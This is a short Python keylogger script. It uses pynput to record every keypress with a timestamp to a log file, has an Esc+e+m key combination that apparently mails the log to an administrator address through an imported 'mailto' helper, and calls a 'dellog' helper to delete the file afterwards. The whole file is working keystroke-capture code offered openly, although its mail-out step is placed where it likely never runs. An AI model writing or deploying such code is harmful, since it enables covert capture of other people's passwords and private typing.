import logging
import os
from pynput.keyboard import Listener
import keyboard


# create log file of pressed keys
def starting():
    log_Directory = os.getcwd() + '/logs/'  # where to save the file
    print(os.getcwd())  # directory
    # create file
    logging.basicConfig(filename=(log_Directory + "key_log.txt"), level=logging.DEBUG, format='%(asctime)s: %(message)s')

    # if keyboard.is_pressed('Esc') and keyboard.is_pressed('e') and keyboard.is_pressed('m'):
    #     exit()

    # function in logging
    def on_press(key):
        logging.info(key)
        if keyboard.is_pressed('Esc') and keyboard.is_pressed('e') and keyboard.is_pressed('m'):
            exit()
        # when press key save the key in file

    with Listener(on_press=on_press) as listener:
        listener.join()  # infinite cicle

    if keyboard.is_pressed('Esc') and keyboard.is_pressed('e') and keyboard.is_pressed('m'):
        from mailto import sendmail
        # Administrator's email ID
        sendmail("admin@axample.com")
        exit()

    from dellog import delfile
    delfile()
